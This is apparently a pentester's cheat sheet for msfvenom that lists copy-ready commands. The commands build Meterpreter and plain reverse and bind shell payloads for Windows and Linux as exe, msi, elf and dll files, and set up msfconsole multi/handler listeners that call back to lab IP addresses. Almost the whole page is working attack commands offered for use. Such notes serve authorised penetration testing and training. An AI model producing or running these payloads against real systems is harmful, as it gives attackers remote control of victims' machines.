# msfvenom

### Meterpreter Listener & Oneliner

{% code overflow="wrap" %}
```bash
# reverse meterpreter exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.142.155 LPORT=53 -f exe -o rshell.exe

# Listener Oneliner
sudo msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set AutoRunScript post/windows/manage/migrate;set LHOST 192.168.142.155;set LPORT 53;run -j"

# multi/handler Step by step
use exploit/multi/handler  
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.119.128
set LPORT 1234
# Some unstable attack only
# set ExitOnSession false
set AutoRunScript post/windows/manage/migrate
exploit -j

# bind meterpreter exe
msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=53 -f elf -o bind.elf

# multi/handler Step by step
use exploit/multi/handler
set rhost 192.168.56.102
set lport 5555
set payload linux/x64/meterpreter/bind_tcp
run
```
{% endcode %}

### Reverse Shell - x64

{% code overflow="wrap" %}
```bash
# Use nc -nlvp <port number> as reverse shell listener

# Windows non staged
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.142.155 LPORT=53 -f exe -o shell_win_x64.exe

# Windows staged
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.142.155 LPORT=53 -f exe -o shell_win_x64.exe

# MSI installer
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.142.155 LPORT=53 -f msi -o reverse.msi

# Linux non-staged
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.142.131 LPORT=4444 -f elf --platform linux -a x64 > shell_linux_x64_ns

# Linux staged
msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.142.131 LPORT=4444 -f elf --platform linux -a x64 > shell_linux_x64_s
```
{% endcode %}

### Reverse Shell - X86

{% code overflow="wrap" %}
```bash
# Windows non staged
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.148 LPORT=4444 -f exe -o shell_win_x86.exe

# Linux non staged
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.142.131 LPORT=4444 -f elf --platform linux -a x86 > shell_linux_x86_ns
```
{% endcode %}

### Bind Shell

{% code overflow="wrap" %}
```bash
# Windows
msfvenom -p windows/x64/shell_bind_tcp RHOST=10.11.11.11 LPORT=1337 -f exe > shell.exe

# bind with dll
msfvenom -p windows/x64/shell_bind_tcp LHOST=10.11.1.75 LPORT=55550 -f dll > bind.dll
```
{% endcode %}
